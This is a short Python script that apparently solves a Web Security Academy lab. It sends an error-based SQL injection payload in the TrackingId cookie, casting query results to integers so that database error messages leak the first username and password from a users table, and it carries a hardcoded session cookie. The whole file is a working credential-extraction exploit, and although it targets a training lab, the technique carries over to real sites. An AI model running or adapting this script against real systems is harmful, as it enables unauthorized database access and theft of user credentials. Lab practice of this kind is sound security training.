import requests as req
import re

url = 'https://0a1b00b5049adc318396799300b0003c.web-security-academy.net/'
usercookies = {
            "TrackingId": f"' and cast((select username from users limit 1) as int)=1--",
            "session": "hs85wC395xQLa033MDIyx0wyHSwmr5aI"
            
        }
passcookies = {
            "TrackingId": f"' and cast((select password from users limit 1) as int)=1--",
            "session": "hs85wC395xQLa033MDIyx0wyHSwmr5aI"
            
        }
res =  req.get(url, cookies=usercookies)
username = re.search(r'ERROR: invalid input syntax for type integer: "([^"]+)"', res.text).group(1)
res =  req.get(url, cookies=passcookies)
passwd = re.search(r'ERROR: invalid input syntax for type integer: "([^"]+)"', res.text).group(1)

print(f"username: {username}\npassword: {passwd}")
